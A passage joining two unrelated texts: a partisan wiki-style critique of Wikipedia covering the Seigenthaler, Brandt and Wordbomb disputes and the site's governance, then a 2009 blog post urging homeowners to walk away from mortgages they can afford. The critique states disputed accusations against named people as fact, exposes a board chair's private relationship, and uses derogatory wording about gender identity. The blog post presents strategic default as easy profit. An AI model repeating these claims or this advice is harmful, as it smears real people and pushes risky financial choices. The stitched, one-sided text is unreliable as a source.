I was shocked to see what was under my name .
... I 'm telling you right now , Jimmy , that 's not how I want people to see me and understand me .
And what I 'm about , and what I write about in my interviews , et cetera .
So , you know , it 's not just individuals like John , but me and many other people , that just have concerns that this is creating gossip that can be very harmful .
And people go to these sites thinking that this is the truth . ”
“ WALES : Well , I mean , I think the real key is that the site matures over time , the -- all of the articles are edited over and over and over , and improved .
Anyone 's free to contribute .
You 're free to go and contribute . ”
This in fact is not the case .
Phillips was not free to remove objectionable content within her biographical entry , as Daniel Brandt at that exact moment was discovering .
Not four days prior , Wales told Editor & Publisher magazine regarding Brandt 's objections to a false Wikipedia biography created by Wikipedia Administrators about him , " I find it hard to take him very seriously at all , " and libelous slanders remained in Brandt 's biography for a year and half .
Wales told CNN , " we are very , very responsive to complaints and concerns . "
Seigenthaler told the audience " with accountability comes credibility " and expressed fear that , " I 'm afraid we 're going to get regulated media as a result . " [ 55 ]
On December 9 , Seigenthaler appeared on C - SPAN 's Washington Journal with Brian Lamb and articulated his concern that members of Congress or other powerful figures in government may likewise be targeted .
On November 2 , 2006 , days before the mid-term Congressional elections , an anonymous IP address traced to the New York Times changed U.S. House of Representatives Majority Leader Tom DeLay 's Wikipedia biographical entry from " a prominent member of the Republican Party " to " Grand Dragon of the Republican Party . " [ 56 ] [ 57 ]
Seigenthaler wrote a more expansive column in the The Tennessean after the November 30 USA Today piece appeared ,
“ a sudden stream of invective — homophobic , anti-Semitic and racist — spilled , as if from a sewer , onto the Wikipedia page under my name .
.. It identified me as ...a " Nazi , " " fascist - oriented " .... murderer ... there also was the profile picture of Adolf Hitler over the caption , " Press photo of Seigenthaler . "
The accompanying line : " He is secretly responsible for killing all the Jews . " ”
Accountability and Section 230
" Two wikifascists find someone without a biography . "
From Wikipedia Watch . [ 2 ]
The inscription reads ,
Upon his retirement from USA Today , Seigenthaler founded the First Amendment Center , an organization dedicated to a national dialogue about First Amendment rights and values .
Seigenthaler criticized passage of Section 230 of the Communications Decency Act of 1996 .
Section 230 states that " no provider or user of an interactive computer service shall be treated as the publisher or speaker . "
Unlike print and broadcast companies , internet service providers ( ISP 's ) cannot be sued for disseminating defamatory attacks on citizens posted by others .
Seigenthaler noted Jimbo Wales told Brian Lamb in a C - SPAN interview that Wikipedia is accountable and that mistakes are corrected within minutes , but the false information remained in Seigenthaler 's biography for five months .
Seigenthaler concluded ,
“ And so we live in a universe of new media with phenomenal opportunities for worldwide communications and research — but populated by volunteer vandals with poison - pen intellects . [ 58 ] ”
In the case of Zeran v. AOL , Zeran sued AOL for refusing to screen and remove defamatory messages , even after Zeran notified the ISP of their existence .
The lower court ruled for the service provider and the U.S. Court of Appeals for the Fourth Circuit upheld the decision , noting that the intent of Section 230 was to ( 1 ) remove incentives on service providers to restrict speech on the Internet and ( 2 ) encourage self - regulation by service providers . [ 59 ] [ 60 ]
An American citizen who posts material on the Internet that is illegal in a foreign country could be prosecuted if he subjected himself to the jurisdiction of that country .
Internet users who export material that is illegal , that is to say , post material that is accessible and illegal in some foreign countries may be subject to prosecution in that country .
However , under American law , the United States will not extradite a person for engaging in a constitutionally protected activity even if that activity violates a criminal law elsewhere . [ 61 ]
Essjay given oversight
See Main article : Wikipedia : The Essjay scandal
Essjay wrote a professor to persuade her to allow her students to use Wikipedia as a viable source of information and posted a verbatim copy of the email for others to use .
Essjay stated , " I was the administrator who deleted the inappropriate revisions when Mr. Seigenthaler contacted our founder , Jimmy Wales ; it is quite unfortunate that a relatively minor issue on a relatively minor figure has provided so much negative publicity .
[ 51 ]
Seigenthaler noted in his Op - Ed piece , " The motive for the salacious stuff directed at me is reasonably obvious , " and quoted some comments , " We all at Wikipedia think he ( Seigenthaler ) is a horrible , stupid p...k for complaining about small inaccuracies in his biography . " [ 52 ]
Others said , " Mr. Seigenthaler 's attitude and actions are reprehensible and ill - formed , " and “ if there is an error whether large or small , he can correct it . ”
This again , was not true .
Even prior to the Wikipedia policy , Biographies of Living Persons , conflict of interest restrictions existed on the subject of an article editing their own entry .
Another wrote : " Rather than fixing the article himself , he made a legal threat . " [ 62 ]
The Seigenthaler scandal was viewed as " the best thing that ever happened to Wikipedia " as curiosity seekers to view the misinformation skyrocketed Alexa rankings .
Despite the damage to an innocent person and divulgence of Wikipedia 's precarious claim as a viable source , the Seigenthaler scandal was viewed as a triumph and considered " the best thing that ever happened to Wikipedia , " [ 63 ] catapulting it into a top ten most visited website as curiosity seekers responded to the negative publicity . [ 64 ]
The scandal was originally billed as a " hoax " , then " controversy , " then downgraded to " incident , " and now re-upgraded to " controversy , " evidently in response to criticism .
The Wikipedia entry on " Seigenthaler controversy " contains disinformation , making the claim , " After the incident , Wikipedia took steps to prevent a recurrence , including barring unregistered users from creating new pages . "
No actions were ever taken to require disclosure of the real life identities of contributors .
Barring unregistered users from creating new pages had nothing to do with the Seigenthaler scandal — the page already existed when an anonymous IP added the false information .
Registration of accounts requires no accountability of the real life identity of the contributor .
Indeed , many experienced Wikipedia editors and Administrators have dozens of registered accounts , called " sockpuppet accounts . "
Protecting the identities of anonymous high - level Administrators has always been more of a priority to the WikiMedia Foundation than the propagation of false information about real life persons whose identities are known .
Wales was asked by BusinessWeek magazine , “ Why do you feel it is important to allow contributors and site administrators to remain anonymous ? ”
Wales responded , “ there are definitely people working in Wikipedia who may have privacy reasons for not wanting their name on the site …. there are lots of reasons for privacy online that are n’t nefarious . ” [ 65 ]
In the Seigenthaler case , it was the odd circumstance that a victim of false information had a large enough platform to respond , coupled with the welcome fact that the victim fundamentally opposes government regulation of internet speech .
Wikipedia 's " Seigenthaler controversy " also states , " The Foundation added a new level of " oversight " features to the MediaWiki software , [ 12 ] accessible as of 2006 to around 20 experienced editors nominated by Wales , " [ 66 ] one of whom was Essjay .
This ban on anonymous page creation “ reform ” was abandoned less than two years later as Wikipedia 's usage and ratings slumped in the wake of yet more scandals and questions about Wikipedia 's culture , core content policies , and endemic lack of accountability . [ 67 ]
Brandt / Berlet feud
See Main article : Wikipedia : The Daniel Brandt controversy
An ugly far - left sectarian dispute [ 68 ] reared its head in 2005 with disastrous consequences for the site 's credibility .
The feud had been dormant for many years until the need to elevate a “ controversial and notable expert ” above the level of “ partisan and extreme ” defined by its own policies became apparent which would have precluded the so - called “ expert ” as " a source for anything other than himself , ” as Wikipedia 's ever fluid policies dictate .
Daniel Brandt , founder of Namebase , [ 69 ]
Google Watch , and Wikipedia Watch , removed Chip Berlet from his Board of Advisors in 1991 when Berlet refused to sit on the same Board which included Fletcher Prouty . "
Prouty , a retired Air Force colonel whose intelligence career stretched back to accompanying President Franklin Roosevelt to the Teheran conference , was allegorically portrayed as the mysterious “ Man X ” [ 70 ] by Donald Southerland in Oliver Stone 's film , JFK .
A Brandt biographical page was created using Berlet as the source for unsavory attacks on Brandt .
Brandt describes himself as an " accountability activist " [ 71 ] [ 72 ] and claims he originally began working with Wikipedia editors in good faith during October 2005 but any biographical information he revealed was spun against him to depict him in a negative light .
Brandt states ,
“ I soon realized that it was also about Berlet , who was still bent on undermining me .
Berlet was using Wikipedia as part of his political agenda , and he was successful in this . [ 73 ] ”
Berlet 's biography underwent an extensive revision with most of the substantive NPOV criticism cut out .
The revising editor commented , " I kept Daniel Brandt , not because I feel he 's a credible source , but because there 's so little published criticism of Berlet , that I felt I had to retain something . " [ 74 ]
This is an extraordinary statement and raises the question why the same high - level Administrator and author of several of Wikipedia 's core content and citation policies , including Wikipedia : Reliable Sources and Wikipedia : Biographies of Living Persons ( BLP ) , [ 75 ] would use a source she did not consider credible .
Biographies of living persons
Wikipedia : Biographies of Living Persons ( WP : BLP ) policy did not come into being because of the Seigenthaler scandal , but rather over the Brandt controversy , as the originating editor noted in an edit summary . [ 75 ]
Brandt requested Wikipedia delete his biographical entry , and ceased working with editors he suspected of working to further the propagation of false information about him .
Editor & Publisher magazine bills itself as the nation 's oldest trade journal serving the newspaper industry with roots dating back to 1884 .
Wikipedia founder Jimmy Wales responded to questions from Editor & Publisher in a prepared statement on December 1 , 2005 about Daniel Brandt saying ,
“ I do n't regard him as a valid source about anything at all [ 76 ] ”
Wales comments added undue weight [ 77 ] ( WP : UNDUE ) to criticism of Brandt when placed within his biographical entry .
Brandt demanded accountability from the army of unidentified Wikipedia Administrators furthering Chip Berlet 's agenda to destroy Brandt 's credibility , and elevate Berlet 's own as a Wikipedia " expert . "
WikiTruth , the inscription reads ,
" The Big Bad Brandt is Gonna Getcha !
From , the inscription reads ,
Brandt became known as the scourge of the Wikipedia Admin community .
WikiTruth says in its Brandt the Boogeyman entry ,
“ he dates back to a time when people would look up facts in books and would verify information without just doing a copy and paste from an AP news article and thinking they were done .
He compares writing styles , he calls government agencies , and he writes letters .
And when he 's done , he tends to know .
Or at least , he knows where he stands in terms of information .
He 's rather tenacious about getting stuff right .
Wikipedia , of course , does n't do this much at all : depending on the day , they 'll laud a link to a website as being absolutely useless ( it 's on the WEB , of course ) and then the next minute link to a different website to back a " fact " up .
Citing books and printed materials is often a no - go , because nobody can read the original citation , so it gets swept away as well .
Really , you have no idea what 's good and what 's bad , and it 's all one big happy soup - hug .
Therefore , guys like Daniel Brandt are horrible for Wikipedia : he researches .
He finds laws that pertain to situations .
He asks the tough questions that could upset the whole Wiki-cart . ”
Wikipedia continues to publish inaccurate and defamatory articles about living persons , written by anonymous contributors , based on other unreliable sources , and refuses to withdraw or change them .
The victims of its libels have no legal means of compelling Wikipedia to make any changes .
It is not answerable to any court or libel laws and simply behaves as if it is above the law .
The Wordbomb Saga
One of Wikipedia 's most bitter and drawn - out disputes , chronicled in The Register , [ 78 ] centers around the assertion by representatives of Overstock.com [ 79 ] that a mainstream financial journalist Gary Weiss had been editing Wikipedia to impose his point of view on a series of articles relevant to the company .
Weiss was once a reporter with BusinessWeek , in 2007 became a columnist with Forbes , and had for over 10 years been posting under fake names to confuse , distort , hijack Usenet groups , stock message boards , and Wikipedia , to prevent the public from understanding criminal activity . [ 80 ]
Weiss was notorious around the Internet for his public feud with Overstock [ 81 ] and its CEO Patrick Byrne , [ 82 ] ridiculing their campaign against the controversial practice of Naked Short Selling .
In 2006 , Judd Bagley , an ally of Overstock 's Patrick Byrne having interviewed the CEO for a personal project , began editing Wikipedia to counter what was perceived to be a skewed representation of Naked Short Selling and Overstock.com .
He was swiftly dispatched by influential Wikipedia administrators .
Shortly after , Bagley became Overstock 's Director of Communications , and embarked on an aggressive campaign to publicize the dispute on various websites , aiming to expose the administrators he held responsible for protecting Weiss .
Using the moniker “ Wordbomb ” , Bagley presented evidence [ 83 ] suggesting that not only was Gary Weiss editing Wikipedia using the name “ User: Mantanmoreland “ , [ 84 ] but that he was operating other accounts to manipulate consensus and protect his interests in the dispute .
Mantanmoreland violated Wikipedia policies against Conflict of Interest and No Self Promotion by creating an article about himself . [ 85 ]
Bagley proved Weiss had edited Wikipedia from one of two main IPs used by the Depository Trust and Clearing Corporation ( DTCC ) , [ 86 ] the organization charged with settling about a quadrillion stock trades each year .
The DTCC is also the organization Overstock.com CEO Patrick Byrne said acts an enabler of perpetrators of illegal naked short selling of many public companies . [ 87 ]
Wikipedia responded to Bagley 's campaign in typical schoolyard fashion .
The dispute was escalated by a small clique of powerful Wikipedians who seemed less interested in the truth of Bagley 's assertions , and more concerned with attacking perceived threats to the status quo at Wikipedia .
With the approval of Jimbo Wales , administrators sided with “ Mantanmoreland ” / Gary Weiss , and anointed Bagley / Wordbomb an “ Enemy Of The Wiki ” who needed to be silenced — a “ stalker ” and a “ harasser ” for publicizing the details of the person who had been editing relevant articles on Wikipedia , and the people who had been stopping him from doing the same .
For nearly two years , Bagley 's name was invoked to inspire paranoia in the Wikipedia Admin Community to keep questioning editors in line .
It became a textbook case for analysis of the intense group - think Wikipedia has become notorious for .
Judd Bagley was made a target at the highest levels of Wikipedia and became a victim of a global witchhunt by the Wikipedia Admin Community for daring to expose an unholy alliance of abuse and corruption on Wall Street and in the Wikipedia cabal . [ 4 ]
Bagley was repeatedly disparaged [ 88 ] by a cabal of out - of - control administrators such as Guy Chapman , who denounced Bagley as “ lunatic ” and “ evil ” when it suited .
UK Wikimedia representative David Gerard banned an entire area of Utah to prevent Bagley raising his issues and made personally disparaging remarks . [ 89 ]
Wikipedia Arbitrator Fred Bauder claimed that Bagley 's blog AntiSocialMedia.net showed “ moral depravity ” [ 90 ] for challenging the Wiki-elite .
Administrator Phil Sandifer dismissed Bagley in highly personal and offensive language while boasting [ 91 ] that he himself had become a “ powerful and trusted administrator on the 9th biggest website in the world . ”
Other editors who raised Overstock 's quite legitimate complaints were banned as proxies of Judd Bagley .
Paranoia had taken such a hold that editors with productive records from all over the US , and as far afield as Europe and Asia found themselves accused of being Bagley .
When the editor Cla68 [ 92 ] questioned the issue of Gary Weiss editing Wikipedia , he was swiftly blocked by administrator Durova on the orders of Jimbo Wales who wrote , [ 93 ] “ Durova and Guy have my full support here .
No nonsense , zero tolerance , shoot on sight .
No kidding , this has gone on long enough ” .
A study [ 94 ] undertaken by concerned administrators into the editing patterns of “ Mantanmoreland ” came to fruition .
Despite the “ Mantanmoreland ” account ceasing edits on Overstock / Naked Short Selling articles in September 2007 , the study revealed evidence beyond reasonable doubt that the same person had been operating several accounts to “ control ” articles .
Thus affirming Bagley 's claims .
More worryingly for good faith Wikipedians was the revelation [ 95 ] [ 96 ] that Jimbo Wales , alongside leading administrators , had considered that this person was almost certainly Gary Weiss in a private discussion as long ago as September 2007 ( the same month the “ Mantanmoreland ” account quit editing the relevant articles ) .
Meaning that behind the scenes , they were admitting that Bagley was probably right all along , yet in public were vilifying or blocking anyone who publicly stated so .
After the financial meltdown of 2008 , the Securities and Exchange Commission issued directives aimed at curbing abusive naked short selling . [ 97 ]
Patrick
Byrne has been widely recognized as in the forefront of the movement aimed at curbing such abuses . [ 98 ]
Michael Moore
The website MichaelMoore.com , dissatisfied with a Wikipedia editor 's edits to Sicko , published an image of a Wikipedia user on its main page .
This was combined with links to edit both Sicko and the editor 's user page . [ 7 ]
Several Wikipedia editors and Administrators regarded this action on the part of Michael Moore 's official website as an egregious violation of a well publicized ruling to protect Wikipedia editors from outside harassment . [ 8 ] [ 9 ]
The consensus , per Wikipedia 's policy was to remove links from Wikipedia to Michael Moore 's attack site which was urging vengeance and reprisals against an editor who posted criticism of Moore 's film .
In Arbitration , Wikipedia 's internal policy making and dispute resolution arm , the Arbitration chairman publicly admitted ,
“ No question it contained an attack , including a link to edit our user 's page .
The problem is that many of us like Michael Moore very much and do n't care much for the viewpoint of the user involved .
Applying our policy in a rote manner ( Without consideration of the unwritten rule that we support prominent subjects that we like ) yields removal of the link ( At least while it contained the personal attack ) . [ 99 ] ”
Wikipedia 's Neutral Point of View ( NPOV ) , laid down by founder Jimbo Wales allegedly is " absolute and non-negotiable . "
Few people find the claim convincing . [ 10 ] [ 11 ]
The ArbCom chairman further stated , " Obviously we need to make an exception for prominent people whose viewpoint we support . " [ 12 ]
When asked , " How , then , is this remotely compatible with NPOV ? " , the ArbCom chairman responded , " Not at all . " [ 13 ]
The editor whom Michaelmoore.com was urging its viewers to attack and harass is described as " a Fellow at the American Enterprise Institute , a conservative think tank . " [ 14 ]
Sinbad hoax
On March 16 , 2007 , Wikipedia entry on the 50 - year old entertainer Sinbad , born David Adkins , stated : " He succumbed to a fatal heart attack on the morning of March 14 , 2007 . "
This hoax was widely reported in the media . [ 100 ]
Robert Clark
Young revenge edits
From 2006 to 2013 , Robert Clark Young , an author who had only published one novel to mixed reviews , edited Wikipedia extensively with 13,000 edits under username " Qworty . "
He engaged in aggressive behavior making revenge edits to biographical articles of his rival authors and other people against whom he held grudges .
He also puffed up his own Wikipedia autobiography , and repeatedly denied that he was connected to Young .
He also created other single purpose accounts to further his campaign .
[ 101 ] [ 102 ]
Only after his true identity was revealed in a salon.com article , [ 103 ] was Young banned [ 104 ] and efforts made to reverse his vindictive edits .
In essence , he would remove favorable items from the biographies of his enemies or nominate them for deletion .
The salon.com article concluded ,
But Qworty ’s example tells us that even when people call attention to a rogue editor , even when that editor ’s temper tantrums come to the attention of the founder of Wikipedia , it ’s quite possible that no action will be taken .
Rutgers - Ivy League hoax
A Wikipedia entry falsely stated that Rutgers was once invited to join the Ivy League .
Although that false statement was eventually removed from Wikipedia , it was not removed before the Daily News relied on it in this story :
You do n't have to define your college with your football team , but Rutgers long ago decided to give it a try .
Back in 1954 , when it was considered a ' public Ivy , ' Rutgers might have joined the fledgling Ivy League and altered its destiny .
But the school declined the offer - arguably the dumbest mistake in its history .
Ever since then , Rutgers has scrambled to prove itself worthy of playing football with the big boys . " [ 105 ]
Barbara Bauer vs. Wikimedia Foundation
Wikimedia Foundation is one of 17 defendants in a lawsuit suit filed in New Jersey , by Barbara Bauer and her literary agency .
Her Wikipedia article was deleted on March 25 , 2007 by Wikipedia administrator Doc Glasgow as a " bloody disgrace " . [ 106 ] [ Dead link ] [ 106 ] [ 107 ] [ 108 ] [ Dead link ]
GFDL License Issue
Wikipedia 's practice of complete deletion of articles [ 109 ] without reference to the original article , the author (s ) / publisher (s ) of the article , and the history and title(s ) of the article , including modification history , description and appropriate dates , is a direct violation of at least GFDL version 1.2 .
Additionally , the GFDL License states that if the article / document contains Copyright notices , that said notices must be preserved at all times .
If those notices are removed , then they are in violation of Copyright Law , as well as the terms of the GFDL license .
Furthermore , the question of them removing anything outright at all comes into quite a grey area .
If one reads the GFDL License literally , then it implies that once the article document is posted , it is in distribution , and technical measures are not allowed to be taken to prevent the use of the document in question , and that no other conditions whatsoever can be added by the user to those of the GFDL license . [ 110 ] [ 111 ]
However , beginning June 15 , 2009 , the Wikimedia Foundation began transitioning content on Wikipedia to be dual - licensed under both the GFDL and Creative Commons CC - BY - SA 3.0 . [ 112 ]
Censorship
Among the many userboxes that are used by editors in Wikipedia , there is one that claims " Wikipedia is not censored " .
[ 113 ]
This is a lie , as Wikipedia routinely engages in censorship against any edits its editors and administrators do not like for political / ideological reasons ( particularly involving political articles , the " global warming " article , the GamerGate controversy article and articles involving gender - confused individuals and those claiming to be " non-binary " ) and its leftist editors / administrators have been very quick to revert / censor such edits and to quickly block editors who make such edits to fit reality instead of the leftist editors ' personal and ideological preference , wishful thinking and political correctness in defiance of reality and logic .
Cyberbullying
The press have reported on incidents of cyberbullying on Wikipedia . [ 114 ] [ 115 ] [ 116 ]
An editor threatened an Asian student at the Glen A. Wilson High School in 2008 , [ 114 ] [ 115 ] [ 116 ] and a 14 - year - old boy was arrested for making a threat against Niles West High School on Wikipedia in 2006 . [ 117 ]
María Sefidari , the female Chair of the Wikimedia Foundation Board of Directors , is involved in a lesbian relationship with Wikipedia editor Laura Hale , which creates an inherent conflict of interest in the following controversy .
[ 118 ]
Ms. Hale has a long history , dating back to 2011 of incompetent edits and abusing male editors while making false accusations of " misogyny " against editors who correct her edits .
A long - time male administrator , Fram , followed Ms. Hale around making corrections to her problematic edits .
In turn , Ms. Hale complained to the Trust & Security staff of the Wikimedia Foundation , rather than to the volunteer - staffed complaint mechanisms on Wikipedia .
Although the Trust & Security staff has previously banned a few editors for problems involving illegal conduct such as pedophilia , in June 2019 , for the first time , they suspended Fram for one year for alleged " incivility " .
In response , an English Wikipedia administrator lifted the block and was in turn stripped of his administratorship by the Foundation , and several other administrators resigned in protest . [ 119 ]
In response to a Buzzfeed article about the controversy , [ 120 ] Wikimedia Foundation executive director Katharine Maher sent a tweet calling the article " s*** ty " , which drew heavy criticism against her on her Twitter account from other Wikipedia editors for what they indicated was her dismissive and elitist attitude toward those opposed to the Foundation 's unilateral abuse of power . [ 121 ]
As more Wikipedia Administrators and Bureaucrats resign or go on strike , the crisis has also been reported by Breitbart . [ 122 ]
Wikipedia on bestiality
See also : Wikipedia on bestiality and Atheism and bestiality
As noted earlier , the Wikipedia project was initiated by atheists and entrepreneur Jimmy Wales and the agnostic philosophy professor Larry Sanger on January 15 , 2001 . [ 123 ]
Bestiality is the act of engaging in sexual relations with an animal .
As of July 18 , 2012 , Wikipedia 's article on zoophilia / bestiality has an entire section on " arguments for zoophilia " plus pictures depicting zoophilia as well as a section on " arguments against zoophilia " .
As of September 24 , 2011 , Wikipedia has a " Zoophilia and the law " article which has a section on the impact of zoophilia laws where eight alleged negative impacts of zoophilia laws are given , but no positive impacts of the laws are given . [ 124 ]

Trademarks and domain names
The Wikimedia Foundation ( WMF ) uses the licensing of its trademarks as a tool to control local chapters .
Although each local chapter is in theory an autonomous organization , each chapter signs a contract with the WMF as a condition for using its trademarks .
The WMF also tried to stake out control over many domain names that contain the word " wiki " including " wikileaks " .
WikiLeaks and Wikipedia have no affiliation with each other .
( " Wiki " describes a type of website and is not a trademark . ) [ 125 ] [ 126 ]
Wikia did purchase several WikiLeaks - related domain names ( including wikileaks.com and wikileaks.net ) as a " protective brand measure " in 2007 . [ 127 ]
Wikia started to transfer those domain names to WikiLeaks on June 14 , 2007 , but the transfer was never completed , and Wikia held those domain names when the " Wikileaks scandal " broke . [ 127 ]
Humorous quotes concerning Wikipedia
" ... dealing with the Wikipedians is like walking into a mental hospital : the floors are carpeted , the walls are nicely padded , but you know there ’s a pretty good chance at any given moment one of the inmates will pick up a knife . ” - quote from a New York Times article on Wikipedia written by the journalist and author Judith Newman [ 128 ]
An article entitled Wikipedia Gridlocked by Wikipedia Nerds declared :
“ So who are these Gatekeepers to all the internet 's knowledge ?
A survey the foundation conducted last year determined that the average age of an editor is 26.8 years , and that 87 % of them are men .
As you suspected : nerds . [ 129 ] ”
Jimmy Wales said the typical profile of a Wikipedia contributor is " a 26 - year - old geeky male " who moves on to other ventures , gets married , and leaves the website . [ 130 ]
Seth Meyers noted on his Late Night program , " Wikipedia is now accepting donations using the online currency Bitcoin .
So now you can support information you 're not sure is true with currency you 're not sure is money . " [ 131 ]
When obscure author Patrick Modiano was awarded the Nobel Prize for Literature in October 2014 , few journalists knew much about him .
The person updating his Wikipedia biography to reflect the prize added this warning to the article , " To the Reporter Now Copying From Wikipedia :
Be careful boy .
Primary sources are still best for journos . " [ 132 ] [ 133 ]
Unbiased editor recruitment
Wikipedia claims that anyone can edit it .
That is true to an extent , but its editor pool is self - selecting .
However , on January 25 – 29 , 2012 , the Wikimedia Foundation paid for Gregory Varnum and others to attend and staff a booth at the " 24th National Conference on LGBT Equality : Creating Change " conference in Baltimore , Maryland .
The purpose of the Wikimedia booth was to recruit more LGBT activists to edit Wikipedia .
Although Wikimedia has outreach efforts at other conferences , there has been no outreach at conservative events .
Wikipedia editor Sarah Stierch was the volunteer moderator of the Gender Gap email list where she departed from discussing Wikipedia to freely share her negative experiences with men in her life .
In fall 2011 , she was hired by the WMF as a Community Fellow to work on creating a " Teahouse " for newer Wikipedia editors .
The report on the Teahouse Pilot Project [ 134 ] explained , " If you click through to the Teahouse , it ’s clearly aiming to broaden female participation - just look at the pastel background and references to tea . "
Stierch tried to use Twitter to recruit more female editors into Teahouse and the English Wikipedia .
The report concluded , " Because so much time and energy needed to be spend during the pilot on setting up and maintaining the space , we were n't able to focus as much as we'd have liked on gender - targeted strategies for recruiting female guests and hosts .
There are clearly more experiments that need to be run in order to better integrate the space with other gender gap efforts and WikiWomen 's calls to actions . "
The WMF terminated Stierch on January 9 , 2014 following complaints of her moonlighting as a paid editor . [ 135 ]
On August 18 , 2014 , during the Congressional summer recess , the Cato Institute and Wikimedia DC jointly conducted a seminar to encourage Congressional staff members to edit Wikipedia about pending legislation and policy issues . [ 136 ] [ 137 ]
The panel discussion included Michelle Newby , a full - time Cato employee who edits Wikipedia as a part of her job .
She promised to work with any Congressional Staff that would be interested in editing .
Flaws in governance structure
Perhaps Wikipedia 's greatest structural problem is Jimmy Wales ' inability to remove himself from the process .
He calls himself a " God- King " and rules the site with the style of monarchy , robbing it of its potential to achieve some form of Jeffersonian democracy and accountability .
Wales once speculated that all significant productivity emerged from his circle of a few hundred personal friends while the rest of the world groped along doing only spelling and punctuation mark corrections and other trivial modifications .
The computer programmer and activist Aaron Swartz did a proper analysis and showed that the productivity was the results of many , many thousands of anonymous users .
Swartz later committed suicide .
Wales delegated the run -of - the - mill decision - marking to a hand - picked group he called the Arbitration Committee .
They take months to make any decisions and dole out multi-month to multi-year or permanent intervention solutions .
A reputable encyclopedia usually simply chooses an Editor - in - Chief , i.e. one reputable , mature and experienced person with one mind to make high - quality decisions rapidly and perhaps dispense moderate penalties when needed .
Sanger served as such , but Wales , an Objectivist economics major and former stock options trader , opted to drastically reduce his salary when it became clear that the project would be a success , thus forcing him out .
Wales has since been making a living , in part , by promoting his notions of governance of Internet - based projects , often emphasizing that users should remain anonymous and thus without any serious form of credential or reputation .
The problems are in the structure and in the personality flaws of Wales himself .
Wales takes advantage of this vast pool of free labor to hunt his perceived enemies , somewhat in the style of L. Ron Hubbard or other such supposed founders of movements .
[ Citation Needed ]
Equally important are the flawed steps that Wales took to separate the community of volunteer Wikipedia editors from the financial control of the enterprise .
The servers and software are owned by the Wikimedia Foundation ( WMF ) , a non-profit organization that at first was set up as a membership organization , but quickly changed to a non-membership organization so that members would not have any legal say regarding the organization .
Although people who have made a required minimum number of edits per year can vote for members of the Arbitration Committee and for a minority of the WMF Board seats , at least one community - elected Board member was removed because he did not agree with the majority of the Board .
Of course , Wales is guaranteed a perpetual WMF Board seat as a co-founder .
Originally , revenue from fundraising banners in the United States went to the WMF , but banner revenue in foreign countries went to the chapters located in those countries .
In recent years , the WMF has consolidated all fundraising revenues , with national chapters being forced to apply for specific grants from the WMF .
To further complicate the financial controls , the WMF established a separate endowment at the Tides Foundation which is controlled by that foundation in consultation with an advisory board .
Instead of having a community - selected advisory board or the entire WMF Board serving as the advisory board , the Tides Foundation appointed a new group with Wales and large donors serving .
When the endowment reaches its fundraising target , the advisory board decides whether the funds should stay at the Tides Foundation , be transferred to the WMF , or used in some other way .
So , if Wales has a falling out with the WMF Board over the next ten years , he and his hand - picked advisory board could take the Wikipedia endowment somewhere else .
The editing community has no say in the endowment — who manages it or how the income will be spent .

Jingle Mail , Jingle Mail
December 22 , 2009
Jingle All The Way ;
Oh what fun it is today , to just walk away !
Jingle Mail ( also known as strategic mortgage default ) is the happy - sounding phrase used by banks and mortgage servicers to describe homeowners who simply walk away from their homes and mail the keys back to the bank .
The banker can hear the keys jingling in the envelope from a distance so even before it 's opened , he knows that for this loan the jig is up .
Jingle Mail appears to be the new fad of giving over this holiday season , and next year many more of our neighbors will be seen mailing back keys .
For a high percentage of the ten million homeowners with material negative equity , thought will turn to action even if they can afford to make the mortgage payment , because Jingle Mail can put a lot of money in their pockets !
Why are homeowners willing to walk away even if they afford it ?
First , the government 's program for mortgage loan modification is an abject failure .
To date , only a small percentage of home loans have been put on trial modification and of those that actually go to final modification , a very high percentage re-default and foreclose anyway .
This program is not working because neither the Obama Administration or the banks or Fannie Mae / Freddie Mac , are willing to face cutting the principal owed on the mortgage balance to a realistic number .
Second , J ingle Mail can be very profitable !
Here 's why Jingle Mail makes so much more sense than continuing to pay an inflated mortgage .
Think about your average high - end homeowner .
Let 's call him Joe .
A few years ago , Joe listened to Alan Greenspan and took a huge amount of money out of his house with an adjustable rate or option ARM mortgage .
If he bought that house for $ 900,000 with an option ARM mortgage of $ 850,000 , since most of his interest has been accrued , his mortgage balance has now risen to $ 1,000,000 , while his house has fallen in value to $ 600,000 , leaving it worth $ 400,000 less than his mortgage balance .
Ouch !
His situation is crystal clear :
He can pay forever , and never own the house !
If he walks away , he makes a quick $ 400,000 of principal he will never have to pay !
Then , if his million dollar mortgage adjusts to a current 6 percent interest payment , he saves the $ 5,000 a month in interest charges ( or $ 60,000 a year ) until foreclosure .
Finally , Joe saves the $ 15,000 in property taxes by not paying them .
( Now that the bank owns the house , they can pay the taxes . )
Next , he notices a house just like his down the block can be rented for $ 3,000 ( a savings of $ 2,000 a month ) , but he decides there 's no rush to move out and rent .
This translates into a first year gain of $ 475,000 with $ 75,000 of that amount in real cash that Joe did n't need to spend .
Between principal forgiveness and cash savings , he can pocket a small fortune and for the cost of a single postage stamp , mailing back the keys is one heck of a self - help economic stimulus program .
Because it can take an inordinate amount of time for a bank or mortgage lender to foreclose , for accounting purposes the bank will almost always favor delaying foreclosure , as they pretend the homeowner will eventually honor the loan .
But if a bank takes too many losses , the FDIC will take them over and the banker will lose his cushy job .
Over the next year , you can count on the banks to become complicit in extending their loans , giving Joe a lot of time before he gets booted out of the house .
Indeed , it 's common for a homeowner who stops paying the mortgage to live rent free for up to a year or more !
Sure , Joe 's credit rating may suffer for a year or two , and in some states the bank might chase him for the deficiency balance on the mortgage .
But in the real world , if Joe pockets the money or pays down his credit cards in a short period of time , his credit rating will eventually go back up .
If Joe wants to be a home owner again , in two or three years he can save up enough for a 20 percent cash down payment !
( Think about how much you could save if you did n't have a mortgage and could cut your monthly housing costs in half by not paying interest and taxes . )
If the bank chases Joe , he 'll soon discover that his bad mortgage debt will be sold to debt collectors , and he 'll eventually be able to settle for pennies on the dollar .
Certainly , not every homeowner is hundreds of thousands of dollars upside down on their mortgage and not everyone is going to save this amazing amount of cash .
But then again , a lot of people are worried about making the car payment and feeding their families , so cash - strapped households wo n't hesitate for a minute to resort to desperate measures by walking away and potentially saving $ 10,000 or more a year .
They certainly were n't responsible for causing this near depression , and they need to survive this economic downturn .
How expensive will Jingle Mail be ?
Well , rumblings out of the US Treasury suggest that taxpayer support for Fannie & Freddie may have to be raised from a potential $ 400 billion to $ 800 billion in losses .
The extra $ 400 billion in estimated losses on government - sponsored prime mortgages is a combination of lingering unemployment and Jingle Mail !
Next in line will be jumbo mortgages that are beginning to look catastrophic because the bigger the house the bigger the mortgage , and the higher the taxes .
In 2009 , mortgage foreclosures will total about four million .
In 2010 , the total could easily be 4.5 million , with 1.5 million or more Jingle Mail - style defaults .
The banks will be rocked by several extra hundred billions of credit losses from people who can afford to make their payments .
